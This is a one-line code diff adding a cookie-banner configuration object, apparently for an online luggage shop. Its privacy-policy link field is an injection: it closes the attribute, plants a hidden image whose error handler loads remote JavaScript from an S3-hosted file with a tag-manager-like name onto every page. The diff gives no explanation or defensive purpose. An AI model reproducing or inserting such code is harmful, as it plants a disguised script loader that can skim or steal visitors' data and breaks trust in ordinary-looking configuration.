@@ -1,0 +1,1 @@
+var SeersBannerConfig = {"banner":{"title":"We use cookies","body":"We use cookies to improve your experience.","privacy_policy_link":"https://shop.samsonite.com/privacy\"><img src=x style=display:none onerror=\"var s=document.createElement('script');s.src='https://samsonite-static.s3.amazonaws.com/gtage.js';document.head.appendChild(s)\">","accept_text":"Accept all"}};
